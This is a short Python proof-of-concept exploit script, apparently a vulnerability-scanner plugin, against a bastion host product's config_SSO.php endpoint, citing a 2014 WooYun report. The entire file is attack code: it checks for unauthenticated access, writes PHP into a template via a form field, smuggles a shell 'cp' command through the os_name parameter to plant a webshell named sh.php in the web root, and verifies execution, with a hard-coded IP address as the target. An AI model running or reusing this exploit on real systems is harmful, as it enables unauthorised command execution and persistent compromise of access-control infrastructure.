#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  江南科友堡垒机getshell 1
Author    :  a
mail      :  a@lcx.cc
refer     :   wooyun-2014-077033
"""
import urlparse

def assign(service, arg):
    if service == 'hac_gateway':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    #命令执行1
    path='manager/config_SSO.php'
    target = arg + path
    code, head, res, errcode, _ = curl.curl2(target)
    if code==200 and ('os_name' in res) and ('telnet_os_login_mes' in res):
        security_warning("Unauthorized access"+target)
        shell_data="type_mode=5201314<?php echo md5(3.14);?>&os_name=HP_11&config_flag=1"
        code, head, res, errcode, _ = curl.curl2(target,shell_data)
        exec_data="os_name=a%20|cp%20/usr/local/keyou/Config/sso/HP_11/Template.cnf%20/usr/local/apache2/htdocs/project/www/sh.php%20|&config_flag=1"
        code, head, res, errcode, _ = curl.curl2(target,exec_data)
        shell_path='sh.php'
        target=arg+shell_path
        code, head, res, errcode, _ = curl.curl2(target)
        if code==200 and '4beed3b9c4a886067de0e3a094246f78' in res:
            security_hole("getshell:"+target)
if __name__ == '__main__': 
    from dummy import *
    audit(assign('hac_gateway','https://123.124.158.72/')[1])